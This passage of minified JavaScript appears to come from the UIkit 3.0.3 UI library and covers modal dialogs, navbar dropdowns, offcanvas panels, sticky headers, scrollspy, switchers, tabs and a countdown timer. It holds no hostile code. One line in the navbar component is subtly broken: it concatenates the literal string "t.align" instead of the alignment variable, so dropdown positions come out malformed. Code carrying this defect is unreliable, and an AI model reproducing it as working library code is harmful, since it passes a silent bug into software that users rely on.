                        return n.$destroy(!0)
                    })
                }), n
            }, a.modal.alert = function(e, i) {
                return i = R({
                    bgClose: !1,
                    escClose: !1,
                    labels: a.modal.labels
                }, i), new Xt(function(t) {
                    return Ht(a.modal.dialog(' <div class="uk-modal-body">' + (_(e) ? e : se(e)) + '</div> <div class="uk-modal-footer uk-text-right"> <button class="uk-button uk-button-primary uk-modal-close" autofocus>' + i.labels.ok + "</button> </div> ", i).$el, "hide", t)
                })
            }, a.modal.confirm = function(r, o) {
                return o = R({
                    bgClose: !1,
                    escClose: !0,
                    labels: a.modal.labels
                }, o), new Xt(function(e, t) {
                    var i = a.modal.dialog(' <form> <div class="uk-modal-body">' + (_(r) ? r : se(r)) + '</div> <div class="uk-modal-footer uk-text-right"> <button class="uk-button uk-button-default uk-modal-close" type="button">' + o.labels.cancel + '</button> <button class="uk-button uk-button-primary" autofocus>' + o.labels.ok + "</button> </div> </form> ", o),
                        n = !1;
                    Ht(i.$el, "submit", "form", function(t) {
                        t.preventDefault(), e(), n = !0, i.hide()
                    }), Ht(i.$el, "hide", function() {
                        n || t()
                    })
                })
            }, a.modal.prompt = function(t, o, s) {
                return s = R({
                    bgClose: !1,
                    escClose: !0,
                    labels: a.modal.labels
                }, s), new Xt(function(e) {
                    var i = a.modal.dialog(' <form class="uk-form-stacked"> <div class="uk-modal-body"> <label>' + (_(t) ? t : se(t)) + '</label> <input class="uk-input" autofocus> </div> <div class="uk-modal-footer uk-text-right"> <button class="uk-button uk-button-default uk-modal-close" type="button">' + s.labels.cancel + '</button> <button class="uk-button uk-button-primary">' + s.labels.ok + "</button> </div> </form> ", s),
                        n = be("input", i.$el);
                    n.value = o;
                    var r = !1;
                    Ht(i.$el, "submit", "form", function(t) {
                        t.preventDefault(), e(n.value), r = !0, i.hide()
                    }), Ht(i.$el, "hide", function() {
                        r || e(null)
                    })
                })
            }, a.modal.labels = {
                ok: "Ok",
                cancel: "Cancel"
            }
        },
        mixins: [Wn],
        data: {
            clsPage: "uk-modal-page",
            selPanel: ".uk-modal-dialog",
            selClose: ".uk-modal-close, .uk-modal-close-default, .uk-modal-close-outside, .uk-modal-close-full"
        },
        events: [{
            name: "show",
            self: !0,
            handler: function() {
                Te(this.panel, "uk-margin-auto-vertical") ? ke(this.$el, "uk-flex") : De(this.$el, "display", "block"), ti(this.$el)
            }
        }, {
            name: "hidden",
            self: !0,
            handler: function() {
                De(this.$el, "display", ""), $e(this.$el, "uk-flex")
            }
        }]
    };
    var Rn = {
            extends: Wi,
            data: {
                targets: "> .uk-parent",
                toggle: "> a",
                content: "> ul"
            }
        },
        qn = {
            mixins: [Li, on],
            props: {
                dropdown: String,
                mode: "list",
                align: String,
                offset: Number,
                boundary: Boolean,
                boundaryAlign: Boolean,
                clsDrop: String,
                delayShow: Number,
                delayHide: Number,
                dropbar: Boolean,
                dropbarMode: String,
                dropbarAnchor: Boolean,
                duration: Number
            },
            data: {
                dropdown: ".uk-navbar-nav > li",
                align: Ct ? "right" : "left",
                clsDrop: "uk-navbar-dropdown",
                mode: void 0,
                offset: void 0,
                delayShow: void 0,
                delayHide: void 0,
                boundaryAlign: void 0,
                flip: "x",
                boundary: !0,
                dropbar: !1,
                dropbarMode: "slide",
                dropbarAnchor: !1,
                duration: 200,
                forceHeight: !0,
                selMinHeight: ".uk-navbar-nav > li > a, .uk-navbar-item, .uk-navbar-toggle"
            },
            computed: {
                boundary: function(t, e) {
                    var i = t.boundary,
                        n = t.boundaryAlign;
                    return !0 === i || n ? e : i
                },
                dropbarAnchor: function(t, e) {
                    return nt(t.dropbarAnchor, e)
                },
                pos: function(t) {
                    return "bottom-" + "t.align"
                },
                dropdowns: function(t, e) {
                    return ye(t.dropdown + " ." + t.clsDrop, e)
                }
            },
            beforeConnect: function() {
                var t = this.$props.dropbar;
                this.dropbar = t && (nt(t, this.$el) || be("+ .uk-navbar-dropbar", this.$el) || be("<div></div>")), this.dropbar && (ke(this.dropbar, "uk-navbar-dropbar"), "slide" === this.dropbarMode && ke(this.dropbar, "uk-navbar-dropbar-slide"))
            },
            disconnected: function() {
                this.dropbar && ue(this.dropbar)
            },
            update: function() {
                var e = this;
                this.$create("drop", this.dropdowns.filter(function(t) {
                    return !e.getDropdown(t)
                }), R({}, this.$props, {
                    boundary: this.boundary,
                    pos: this.pos,
                    offset: this.dropbar || this.offset
                }))
            },
            events: [{
                name: "mouseover",
                delegate: function() {
                    return this.dropdown
                },
                handler: function(t) {
                    var e = t.current,
                        i = this.getActive();
                    i && i.toggle && !Tt(i.toggle.$el, e) && !i.tracker.movesTo(i.$el) && i.hide(!1)
                }
            }, {
                name: "mouseleave",
                el: function() {
                    return this.dropbar
                },
                handler: function() {
                    var t = this.getActive();
                    t && !pt(this.dropbar, ":hover") && t.hide()
                }
            }, {
                name: "beforeshow",
                capture: !0,
                filter: function() {
                    return this.dropbar
                },
                handler: function() {
                    this.dropbar.parentNode || le(this.dropbarAnchor || this.$el, this.dropbar)
                }
            }, {
                name: "show",
                capture: !0,
                filter: function() {
                    return this.dropbar
                },
                handler: function(t, e) {
                    var i = e.$el,
                        n = e.dir;
                    this.clsDrop && ke(i, this.clsDrop + "-dropbar"), "bottom" === n && this.transitionTo(i.offsetHeight + P(De(i, "marginTop")) + P(De(i, "marginBottom")), i)
                }
            }, {
                name: "beforehide",
                filter: function() {
                    return this.dropbar
                },
                handler: function(t, e) {
                    var i = e.$el,
                        n = this.getActive();
                    pt(this.dropbar, ":hover") && n && n.$el === i && t.preventDefault()
                }
            }, {
                name: "hide",
                filter: function() {
                    return this.dropbar
                },
                handler: function(t, e) {
                    var i = e.$el,
                        n = this.getActive();
                    (!n || n && n.$el === i) && this.transitionTo(0)
                }
            }],
            methods: {
                getActive: function() {
                    var t = this.dropdowns.map(this.getDropdown).filter(function(t) {
                        return t && t.isActive()
                    })[0];
                    return t && b(t.mode, "hover") && Tt(t.toggle.$el, this.$el) && t
                },
                transitionTo: function(t, e) {
                    var i = this,
                        n = this.dropbar,
                        r = kt(n) ? ti(n) : 0;
                    return De(e = r < t && e, "clip", "rect(0," + e.offsetWidth + "px," + r + "px,0)"), ti(n, r), Ve.cancel([e, n]), Xt.all([Ve.start(n, {
                        height: t
                    }, this.duration), Ve.start(e, {
                        clip: "rect(0," + e.offsetWidth + "px," + t + "px,0)"
                    }, this.duration)]).catch(K).then(function() {
                        De(e, {
                            clip: ""
                        }), i.$update(n)
                    })
                },
                getDropdown: function(t) {
                    return this.$getComponent(t, "drop") || this.$getComponent(t, "dropdown")
                }
            }
        },
        Un = {
            mixins: [Wn],
            args: "mode",
            props: {
                mode: String,
                flip: Boolean,
                overlay: Boolean
            },
            data: {
                mode: "slide",
                flip: !1,
                overlay: !1,
                clsPage: "uk-offcanvas-page",
                clsContainer: "uk-offcanvas-container",
                selPanel: ".uk-offcanvas-bar",
                clsFlip: "uk-offcanvas-flip",
                clsContainerAnimation: "uk-offcanvas-container-animation",
                clsSidebarAnimation: "uk-offcanvas-bar-animation",
                clsMode: "uk-offcanvas",
                clsOverlay: "uk-offcanvas-overlay",
                selClose: ".uk-offcanvas-close"
            },
            computed: {
                clsFlip: function(t) {
                    var e = t.flip,
                        i = t.clsFlip;
                    return e ? i : ""
                },
                clsOverlay: function(t) {
                    var e = t.overlay,
                        i = t.clsOverlay;
                    return e ? i : ""
                },
                clsMode: function(t) {
                    var e = t.mode;
                    return t.clsMode + "-" + e
                },
                clsSidebarAnimation: function(t) {
                    var e = t.mode,
                        i = t.clsSidebarAnimation;
                    return "none" === e || "reveal" === e ? "" : i
                },
                clsContainerAnimation: function(t) {
                    var e = t.mode,
                        i = t.clsContainerAnimation;
                    return "push" !== e && "reveal" !== e ? "" : i
                },
                transitionElement: function(t) {
                    return "reveal" === t.mode ? this.panel.parentNode : this.panel
                }
            },
            events: [{
                name: "click",
                delegate: function() {
                    return 'a[href^="#"]'
                },
                handler: function(t) {
                    var e = t.current;
                    e.hash && be(e.hash, document.body) && this.hide()
                }
            }, {
                name: "touchstart",
                el: function() {
                    return this.panel
                },
                handler: function(t) {
                    var e = t.targetTouches;
                    1 === e.length && (this.clientY = e[0].clientY)
                }
            }, {
                name: "touchmove",
                self: !0,
                passive: !1,
                filter: function() {
                    return this.overlay
                },
                handler: function(t) {
                    t.preventDefault()
                }
            }, {
                name: "touchmove",
                passive: !1,
                el: function() {
                    return this.panel
                },
                handler: function(t) {
                    if (1 === t.targetTouches.length) {
                        var e = event.targetTouches[0].clientY - this.clientY,
                            i = this.panel,
                            n = i.scrollTop,
                            r = i.scrollHeight,
                            o = i.clientHeight;
                        (r <= o || 0 === n && 0 < e || r - n <= o && e < 0) && t.preventDefault()
                    }
                }
            }, {
                name: "show",
                self: !0,
                handler: function() {
                    "reveal" !== this.mode || Te(this.panel.parentNode, this.clsMode) || (de(this.panel, "<div>"), ke(this.panel.parentNode, this.clsMode)), De(document.documentElement, "overflowY", this.overlay ? "hidden" : ""), ke(document.body, this.clsContainer, this.clsFlip), De(this.$el, "display", "block"), ke(this.$el, this.clsOverlay), ke(this.panel, this.clsSidebarAnimation, "reveal" !== this.mode ? this.clsMode : ""), ti(document.body), ke(document.body, this.clsContainerAnimation), this.clsContainerAnimation && (Xn().content += ",user-scalable=0")
                }
            }, {
                name: "hide",
                self: !0,
                handler: function() {
                    $e(document.body, this.clsContainerAnimation);
                    var t = this.getActive();
                    ("none" === this.mode || t && t !== this && t !== this.prev) && jt(this.panel, "transitionend")
                }
            }, {
                name: "hidden",
                self: !0,
                handler: function() {
                    var t;
                    this.clsContainerAnimation && ((t = Xn()).content = t.content.replace(/,user-scalable=0$/, "")), "reveal" === this.mode && pe(this.panel), $e(this.panel, this.clsSidebarAnimation, this.clsMode), $e(this.$el, this.clsOverlay), De(this.$el, "display", ""), $e(document.body, this.clsContainer, this.clsFlip), De(document.documentElement, "overflowY", "")
                }
            }, {
                name: "swipeLeft swipeRight",
                handler: function(t) {
                    this.isToggled() && Mi(t) && "swipeLeft" === t.type ^ this.flip && this.hide()
                }
            }]
        };

    function Xn() {
        return be('meta[name="viewport"]', document.head) || ae(document.head, '<meta name="viewport">')
    }
    var Kn = {
            mixins: [Li],
            props: {
                selContainer: String,
                selContent: String
            },
            data: {
                selContainer: ".uk-modal",
                selContent: ".uk-modal-dialog"
            },
            computed: {
                container: function(t, e) {
                    return gt(e, t.selContainer)
                },
                content: function(t, e) {
                    return gt(e, t.selContent)
                }
            },
            connected: function() {
                De(this.$el, "minHeight", 150)
            },
            update: {
                read: function() {
                    return !(!this.content || !this.container) && {
                        current: P(De(this.$el, "maxHeight")),
                        max: Math.max(150, ti(this.container) - (Je(this.content).height - ti(this.$el)))
                    }
                },
                write: function(t) {
                    var e = t.current,
                        i = t.max;
                    De(this.$el, "maxHeight", i), Math.round(e) !== Math.round(i) && jt(this.$el, "resize")
                },
                events: ["resize"]
            }
        },
        Gn = {
            props: ["width", "height"],
            connected: function() {
                ke(this.$el, "uk-responsive-width")
            },
            update: {
                read: function() {
                    return !!(kt(this.$el) && this.width && this.height) && {
                        width: ei(this.$el.parentNode),
                        height: this.height
                    }
                },
                write: function(t) {
                    ti(this.$el, Z.contain({
                        height: this.height,
                        width: this.width
                    }, t).height)
                },
                events: ["resize"]
            }
        },
        Jn = {
            props: {
                duration: Number,
                offset: Number
            },
            data: {
                duration: 1e3,
                offset: 0
            },
            methods: {
                scrollTo: function(i) {
                    var n = this;
                    i = i && be(i) || document.body;
                    var t = ti(document),
                        e = ti(window),
                        r = Je(i).top - this.offset;
                    if (t < r + e && (r = t - e), jt(this.$el, "beforescroll", [this, i])) {
                        var o = Date.now(),
                            s = window.pageYOffset,
                            a = function() {
                                var t, e = s + (r - s) * (t = X((Date.now() - o) / n.duration), .5 * (1 - Math.cos(Math.PI * t)));
                                ci(window, e), e !== r ? requestAnimationFrame(a) : jt(n.$el, "scrolled", [n, i])
                            };
                        a()
                    }
                }
            },
            events: {
                click: function(t) {
                    t.defaultPrevented || (t.preventDefault(), this.scrollTo(bt(decodeURIComponent(this.$el.hash)).substr(1)))
                }
            }
        };
    var Zn = {
            args: "cls",
            props: {
                cls: "list",
                target: String,
                hidden: Boolean,
                offsetTop: Number,
                offsetLeft: Number,
                repeat: Boolean,
                delay: Number
            },
            data: function() {
                return {
                    cls: [],
                    target: !1,
                    hidden: !0,
                    offsetTop: 0,
                    offsetLeft: 0,
                    repeat: !1,
                    delay: 0,
                    inViewClass: "uk-scrollspy-inview"
                }
            },
            computed: {
                elements: function(t, e) {
                    var i = t.target;
                    return i ? ye(i, e) : [e]
                }
            },
            update: [{
                write: function() {
                    this.hidden && De(St(this.elements, ":not(." + this.inViewClass + ")"), "visibility", "hidden")
                }
            }, {
                read: function(r) {
                    var o = this;
                    r.update && this.elements.forEach(function(t, e) {
                        var i = r[e];
                        if (!i || i.el !== t) {
                            var n = it(t, "uk-scrollspy-class");
                            i = {
                                el: t,
                                toggles: n && n.split(",") || o.cls
                            }
                        }
                        i.show = hi(t, o.offsetTop, o.offsetLeft), r[e] = i
                    })
                },
                write: function(o) {
                    var s = this;
                    if (!o.update) return this.$emit(), o.update = !0;
                    this.elements.forEach(function(t, e) {
                        var i = o[e],
                            n = i.toggles[e] || i.toggles[0];
                        if (!i.show || i.inview || i.queued) {
                            if (!i.show && (i.inview || i.queued) && s.repeat) {
                                if (i.abort && i.abort(), !i.inview) return;
                                De(t, "visibility", s.hidden ? "hidden" : ""), $e(t, s.inViewClass), Ee(t, n), jt(t, "outview"), s.$update(t), i.inview = !1
                            }
                        } else {
                            var r = function() {
                                De(t, "visibility", ""), ke(t, s.inViewClass), Ee(t, n), jt(t, "inview"), s.$update(t), i.inview = !0, i.abort && i.abort()
                            };
                            s.delay ? (i.queued = !0, o.promise = (o.promise || Xt.resolve()).then(function() {
                                return !i.inview && new Xt(function(t) {
                                    var e = setTimeout(function() {
                                        r(), t()
                                    }, o.promise || 1 === s.elements.length ? s.delay : 0);
                                    i.abort = function() {
                                        clearTimeout(e), t(), i.queued = !1
                                    }
                                })
                            })) : r()
                        }
                    })
                },
                events: ["scroll", "resize"]
            }]
        },
        Qn = {
            props: {
                cls: String,
                closest: String,
                scroll: Boolean,
                overflow: Boolean,
                offset: Number
            },
            data: {
                cls: "uk-active",
                closest: !1,
                scroll: !1,
                overflow: !0,
                offset: 0
            },
            computed: {
                links: function(t, e) {
                    return ye('a[href^="#"]', e).filter(function(t) {
                        return t.hash
                    })
                },
                elements: function(t) {
                    var e = t.closest;
                    return gt(this.links, e || "*")
                },
                targets: function() {
                    return ye(this.links.map(function(t) {
                        return t.hash
                    }).join(","))
                }
            },
            update: [{
                read: function() {
                    this.scroll && this.$create("scroll", this.links, {
                        offset: this.offset || 0
                    })
                }
            }, {
                read: function(o) {
                    var s = this,
                        a = window.pageYOffset + this.offset + 1,
                        h = ti(document) - ti(window) + this.offset;
                    o.active = !1, this.targets.every(function(t, e) {
                        var i = Je(t).top,
                            n = e + 1 === s.targets.length;
                        if (!s.overflow && (0 === e && a < i || n && i + t.offsetTop < a)) return !1;
                        if (!n && Je(s.targets[e + 1]).top <= a) return !0;
                        if (h <= a)
                            for (var r = s.targets.length - 1; e < r; r--)
                                if (hi(s.targets[r])) {
                                    t = s.targets[r];
                                    break
                                }
                        return !(o.active = be(St(s.links, '[href="#' + t.id + '"]')))
                    })
                },
                write: function(t) {
                    var e = t.active;
                    this.links.forEach(function(t) {
                        return t.blur()
                    }), $e(this.elements, this.cls), e && jt(this.$el, "active", [e, ke(this.closest ? gt(e, this.closest) : e, this.cls)])
                },
                events: ["scroll", "resize"]
            }]
        },
        tr = {
            mixins: [Li, Pn],
            props: {
                top: null,
                bottom: Boolean,
                offset: Number,
                animation: String,
                clsActive: String,
                clsInactive: String,
                clsFixed: String,
                clsBelow: String,
                selTarget: String,
                widthElement: Boolean,
                showOnUp: Boolean,
                targetOffset: Number
            },
            data: {
                top: 0,
                bottom: !1,
                offset: 0,
                animation: "",
                clsActive: "uk-active",
                clsInactive: "",
                clsFixed: "uk-sticky-fixed",
                clsBelow: "uk-sticky-below",
                selTarget: "",
                widthElement: !1,
                showOnUp: !1,
                targetOffset: !1
            },
            computed: {
                selTarget: function(t, e) {
                    var i = t.selTarget;
                    return i && be(i, e) || e
                },
                widthElement: function(t, e) {
                    return nt(t.widthElement, e) || this.placeholder
                },
                isActive: {
                    get: function() {
                        return Te(this.selTarget, this.clsActive)
                    },
                    set: function(t) {
                        t && !this.isActive ? (Se(this.selTarget, this.clsInactive, this.clsActive), jt(this.$el, "active")) : t || Te(this.selTarget, this.clsInactive) || (Se(this.selTarget, this.clsActive, this.clsInactive), jt(this.$el, "inactive"))
                    }
                }
            },
            connected: function() {
                this.placeholder = be("+ .uk-sticky-placeholder", this.$el) || be('<div class="uk-sticky-placeholder"></div>'), this.isFixed = !1, this.isActive = !1
            },
            disconnected: function() {
                this.isFixed && (this.hide(), $e(this.selTarget, this.clsInactive)), ue(this.placeholder), this.placeholder = null, this.widthElement = null
            },
            events: [{
                name: "load hashchange popstate",
                el: window,
                handler: function() {
                    var n = this;
                    if (!1 !== this.targetOffset && location.hash && 0 < window.pageYOffset) {
                        var r = be(location.hash);
                        r && pi.read(function() {
                            var t = Je(r).top,
                                e = Je(n.$el).top,
                                i = n.$el.offsetHeight;
                            n.isFixed && t <= e + i && e <= t + r.offsetHeight && ci(window, t - i - (D(n.targetOffset) ? n.targetOffset : 0) - n.offset)
                        })
                    }
                }
            }],
            update: [{
                read: function(t, e) {
                    var i = t.height;
                    this.isActive && "update" !== e && (this.hide(), i = this.$el.offsetHeight, this.show()), i = this.isActive ? i : this.$el.offsetHeight, this.topOffset = Je(this.isFixed ? this.placeholder : this.$el).top, this.bottomOffset = this.topOffset + i;
                    var n = er("bottom", this);
                    return this.top = Math.max(P(er("top", this)), this.topOffset) - this.offset, this.bottom = n && n - i, this.inactive = !this.matchMedia, {
                        lastScroll: !1,
                        height: i,
                        margins: De(this.$el, ["marginTop", "marginBottom", "marginLeft", "marginRight"])
                    }
                },
                write: function(t) {
                    var e = t.height,
                        i = t.margins,
                        n = this.placeholder;
                    De(n, R({
                        height: e
                    }, i)), Tt(n, document) || (le(this.$el, n), Q(n, "hidden", "")), this.isActive = this.isActive
                },
                events: ["resize"]
            }, {
                read: function(t) {
                    var e = t.scroll;
                    return void 0 === e && (e = 0), this.width = (kt(this.widthElement) ? this.widthElement : this.$el).offsetWidth, this.scroll = window.pageYOffset, {
                        dir: e <= this.scroll ? "down" : "up",
                        scroll: this.scroll,
                        visible: kt(this.$el),
                        top: ui(this.placeholder)[0]
                    }
                },
                write: function(t, e) {
                    var i = this,
                        n = t.initTimestamp;
                    void 0 === n && (n = 0);
                    var r = t.dir,
                        o = t.lastDir,
                        s = t.lastScroll,
                        a = t.scroll,
                        h = t.top,
                        l = t.visible,
                        c = performance.now();
                    if (!((t.lastScroll = a) < 0 || a === s || !l || this.disabled || this.showOnUp && "scroll" !== e || ((300 < c - n || r !== o) && (t.initScroll = a, t.initTimestamp = c), t.lastDir = r, this.showOnUp && Math.abs(t.initScroll - a) <= 30 && Math.abs(s - a) <= 10)))
                        if (this.inactive || a < this.top || this.showOnUp && (a <= this.top || "down" === r || "up" === r && !this.isFixed && a <= this.bottomOffset)) {
                            if (!this.isFixed) return void(Xe.inProgress(this.$el) && a < h && (Xe.cancel(this.$el), this.hide()));
                            this.isFixed = !1, this.animation && a > this.topOffset ? (Xe.cancel(this.$el), Xe.out(this.$el, this.animation).then(function() {
                                return i.hide()
                            }, K)) : this.hide()
                        } else this.isFixed ? this.update() : this.animation ? (Xe.cancel(this.$el), this.show(), Xe.in(this.$el, this.animation).catch(K)) : this.show()
                },
                events: ["resize", "scroll"]
            }],
            methods: {
                show: function() {
                    this.isFixed = !0, this.update(), Q(this.placeholder, "hidden", null)
                },
                hide: function() {
                    this.isActive = !1, $e(this.$el, this.clsFixed, this.clsBelow), De(this.$el, {
                        position: "",
                        top: "",
                        width: ""
                    }), Q(this.placeholder, "hidden", "")
                },
                update: function() {
                    var t = 0 !== this.top || this.scroll > this.top,
                        e = Math.max(0, this.offset);
                    this.bottom && this.scroll > this.bottom - this.offset && (e = this.bottom - this.scroll), De(this.$el, {
                        position: "fixed",
                        top: e + "px",
                        width: this.width
                    }), this.isActive = t, Ee(this.$el, this.clsBelow, this.scroll > this.bottomOffset), ke(this.$el, this.clsFixed)
                }
            }
        };

    function er(t, e) {
        var i = e.$props,
            n = e.$el,
            r = e[t + "Offset"],
            o = i[t];
        if (o) {
            if (D(o)) return r + P(o);
            if (_(o) && o.match(/^-?\d+vh$/)) return ti(window) * P(o) / 100;
            var s = !0 === o ? n.parentNode : nt(o, n);
            return s ? Je(s).top + s.offsetHeight : void 0
        }
    }
    var ir, nr = {
            mixins: [ji],
            args: "connect",
            props: {
                connect: String,
                toggle: String,
                active: Number,
                swiping: Boolean
            },
            data: {
                connect: "~.uk-switcher",
                toggle: "> * > :first-child",
                active: 0,
                swiping: !0,
                cls: "uk-active",
                clsContainer: "uk-switcher",
                attrItem: "uk-switcher-item",
                queued: !0
            },
            computed: {
                connects: function(t, e) {
                    return rt(t.connect, e)
                },
                toggles: function(t, e) {
                    return ye(t.toggle, e)
                }
            },
            events: [{
                name: "click",
                delegate: function() {
                    return this.toggle + ":not(.uk-disabled)"
                },
                handler: function(e) {
                    e.preventDefault(), this.show(L(this.$el.children).filter(function(t) {
                        return Tt(e.current, t)
                    })[0])
                }
            }, {
                name: "click",
                el: function() {
                    return this.connects
                },
                delegate: function() {
                    return "[" + this.attrItem + "],[data-" + this.attrItem + "]"
                },
                handler: function(t) {
                    t.preventDefault(), this.show(it(t.current, this.attrItem))
                }
            }, {
                name: "swipeRight swipeLeft",
                filter: function() {
                    return this.swiping
                },
                el: function() {
                    return this.connects
                },
                handler: function(t) {
                    Mi(t) && (t.preventDefault(), window.getSelection().toString() || this.show("swipeLeft" === t.type ? "next" : "previous"))
                }
            }],
            update: function() {
                var e = this;
                this.connects.forEach(function(t) {
                    return e.updateAria(t.children)
                });
                var t = this.$el.children;
                this.show(St(t, "." + this.cls)[0] || t[this.active] || t[0])
            },
            methods: {
                index: function() {
                    return !!this.connects.length && ne(St(this.connects[0].children, "." + this.cls)[0])
                },
                show: function(t) {
                    for (var e, i, n = this, r = this.$el.children, o = r.length, s = this.index(), a = 0 <= s, h = "previous" === t ? -1 : 1, l = re(t, r, s), c = 0; c < o; c++, l = (l + h + o) % o)
                        if (!pt(this.toggles[l], ".uk-disabled *, .uk-disabled, [disabled]")) {
                            e = this.toggles[l], i = r[l];
                            break
                        }!i || 0 <= s && Te(i, this.cls) || s === l || ($e(r, this.cls), ke(i, this.cls), Q(this.toggles, "aria-expanded", !1), Q(e, "aria-expanded", !0), this.connects.forEach(function(t) {
                        a ? n.toggleElement([t.children[s], t.children[l]]) : n.toggleNow(t.children[l])
                    }))
                }
            }
        },
        rr = {
            mixins: [Li],
            extends: nr,
            props: {
                media: Boolean
            },
            data: {
                media: 960,
                attrItem: "uk-tab-item"
            },
            connected: function() {
                var t = Te(this.$el, "uk-tab-left") ? "uk-tab-left" : !!Te(this.$el, "uk-tab-right") && "uk-tab-right";
                t && this.$create("toggle", this.$el, {
                    cls: t,
                    mode: "media",
                    media: this.media
                })
            }
        },
        or = {
            mixins: [Pn, ji],
            args: "target",
            props: {
                href: String,
                target: null,
                mode: "list"
            },
            data: {
                href: !1,
                target: !1,
                mode: "click",
                queued: !0
            },
            computed: {
                target: function(t, e) {
                    var i = t.href,
                        n = t.target;
                    return (n = rt(n || i, e)).length && n || [e]
                }
            },
            connected: function() {
                jt(this.target, "updatearia", [this])
            },
            events: [{
                name: Bt + " " + zt,
                filter: function() {
                    return b(this.mode, "hover")
                },
                handler: function(t) {
                    Mi(t) || this.toggle("toggle" + (t.type === Bt ? "show" : "hide"))
                }
            }, {
                name: "click",
                filter: function() {
                    return b(this.mode, "click") || _t && b(this.mode, "hover")
                },
                handler: function(t) {
                    var e;
                    (Mi(t) || b(this.mode, "click")) && ((gt(t.target, 'a[href="#"], a[href=""], button') || (e = gt(t.target, "a[href]")) && (this.cls || !kt(this.target) || e.hash && pt(this.target, e.hash))) && t.preventDefault(), this.toggle())
                }
            }],
            update: {
                write: function() {
                    if (b(this.mode, "media") && this.media) {
                        var t = this.isToggled(this.target);
                        (this.matchMedia ? !t : t) && this.toggle()
                    }
                },
                events: ["resize"]
            },
            methods: {
                toggle: function(t) {
                    jt(this.target, t || "toggle", [this]) && this.toggleElement(this.target)
                }
            }
        };
    Fi.version = "3.0.3", (ir = Fi).component("accordion", Wi), ir.component("alert", Vi), ir.component("cover", Xi), ir.component("drop", Gi), ir.component("dropdown", Ji), ir.component("formCustom", Zi), ir.component("gif", Qi), ir.component("grid", rn), ir.component("heightMatch", sn), ir.component("heightViewport", ln), ir.component("icon", vn), ir.component("img", $n), ir.component("leader", Ln), ir.component("margin", tn), ir.component("modal", Yn), ir.component("nav", Rn), ir.component("navbar", qn), ir.component("offcanvas", Un), ir.component("overflowAuto", Kn), ir.component("responsive", Gn), ir.component("scroll", Jn), ir.component("scrollspy", Zn), ir.component("scrollspyNav", Qn), ir.component("sticky", tr), ir.component("svg", dn), ir.component("switcher", nr), ir.component("tab", rr), ir.component("toggle", or), ir.component("video", Ui), ir.component("close", xn), ir.component("marker", wn), ir.component("navbarToggleIcon", wn), ir.component("overlayIcon", wn), ir.component("paginationNext", wn), ir.component("paginationPrevious", wn), ir.component("searchIcon", yn), ir.component("slidenavNext", bn), ir.component("slidenavPrevious", bn), ir.component("spinner", kn), ir.component("totop", wn), ir.use(Yi);
    var sr = {
        mixins: [Li],
        props: {
            date: String,
            clsWrapper: String
        },
        data: {
            date: "",
            clsWrapper: ".uk-countdown-%unit%"
        },
        computed: {
            date: function(t) {
                var e = t.date;
                return Date.parse(e)
            },
            days: function(t, e) {
                return be(t.clsWrapper.replace("%unit%", "days"), e)
            },
            hours: function(t, e) {
                return be(t.clsWrapper.replace("%unit%", "hours"), e)
            },
            minutes: function(t, e) {
                return be(t.clsWrapper.replace("%unit%", "minutes"), e)
            },
            seconds: function(t, e) {
                return be(t.clsWrapper.replace("%unit%", "seconds"), e)
            },
            units: function() {
                var e = this;
                return ["days", "hours", "minutes", "seconds"].filter(function(t) {
                    return e[t]
                })
            }
        },
        connected: function() {
            this.start()
        },
        disconnected: function() {
            var e = this;
            this.stop(), this.units.forEach(function(t) {
                return oe(e[t])
            })
        },
        events: [{
            name: "visibilitychange",
            el: document,
            handler: function() {
                document.hidden ? this.stop() : this.start()
            }
        }],
        update: {
            write: function() {
                var t, e, n = this,
                    r = (t = this.date, {
                        total: e = t - Date.now(),
                        seconds: e / 1e3 % 60,
                        minutes: e / 1e3 / 60 % 60,
                        hours: e / 1e3 / 60 / 60 % 24,
                        days: e / 1e3 / 60 / 60 / 24
                    });
                r.total <= 0 && (this.stop(), r.days = r.hours = r.minutes = r.seconds = 0), this.units.forEach(function(t) {
                    var e = String(Math.floor(r[t]));
                    e = e.length < 2 ? "0" + e : e;
                    var i = n[t];
                    i.textContent !== e && ((e = e.split("")).length !== i.children.length && se(i, e.map(function() {
                        return "<span></span>"
                    }).join("")), e.forEach(function(t, e) {
                        return i.children[e].textContent = t
                    }))
                })
            }
        },
        methods: {
            start: function() {
                var t = this;
                this.stop(), this.date && this.units.length && (this.$emit(), this.timer = setInterval(function() {
                    return t.$emit()
                }, 1e3))
            },
            stop: function() {
                this.timer && (clearInterval(this.timer), this.timer = null)
            }
        }
    };
    var ar, hr = "uk-animation-target",
        lr = {
            props: {
                animation: Number
            },
            data: {
                animation: 150
            },
            computed: {
                target: function() {
                    return this.$el
                }
            },
            methods: {
                animate: function(t) {
                    var n = this;
                    ar || (ar = ae(document.head, "<style>").sheet).insertRule("." + hr + " > * {\n                    margin-top: 0 !important;\n                    transform: none !important;\n                }", 0);
                    var r = L(this.target.children),
                        o = r.map(function(t) {
                            return cr(t, !0)
                        }),
                        e = ti(this.target),
                        i = window.pageYOffset;
                    t(), Ve.cancel(this.target), r.forEach(Ve.cancel), ur(this.target), this.$update(this.target), pi.flush();
                    var s = ti(this.target),
                        a = (r = r.concat(L(this.target.children).filter(function(t) {
                            return !b(r, t)
                        }))).map(function(t, e) {
                            return !!(t.parentNode && e in o) && (o[e] ? kt(t) ? dr(t) : {
                                opacity: 0
                            } : {
                                opacity: kt(t) ? 1 : 0
                            })
                        });
                    return o = a.map(function(t, e) {
                        var i = r[e].parentNode === n.target && (o[e] || cr(r[e]));
                        if (i)
                            if (t) {
                                if (!("opacity" in t)) {
                                    i.opacity % 1 ? t.opacity = 1 : delete i.opacity
                                }
                            } else delete i.opacity;
                        return i
                    }), ke(this.target, hr), r.forEach(function(t, e) {
                        return o[e] && De(t, o[e])
                    }), De(this.target, "height", e), ci(window, i), Xt.all(r.map(function(t, e) {
                        return o[e] && a[e] ? Ve.start(t, a[e], n.animation, "ease") : Xt.resolve()
                    }).concat(Ve.start(this.target, {
                        height: s
                    }, this.animation, "ease"))).then(function() {
                        r.forEach(function(t, e) {
                            return De(t, {
                                display: 0 === a[e].opacity ? "none" : "",
                                zIndex: ""
                            })
                        }), ur(n.target), n.$update(n.target), pi.flush()
                    }, K)
                }
            }
        };

    function cr(t, e) {
        var i = De(t, "zIndex");
        return !!kt(t) && R({
            display: "",
            opacity: e ? De(t, "opacity") : "0",
            pointerEvents: "none",
            position: "absolute",
            zIndex: "auto" === i ? ne(t) : i
        }, dr(t))
    }

    function ur(t) {
        De(t.children, {
            height: "",
            left: "",
            opacity: "",
            pointerEvents: "",
            position: "",
            top: "",
            width: ""
        }), $e(t, hr), De(t, "height", "")
    }

    function dr(t) {
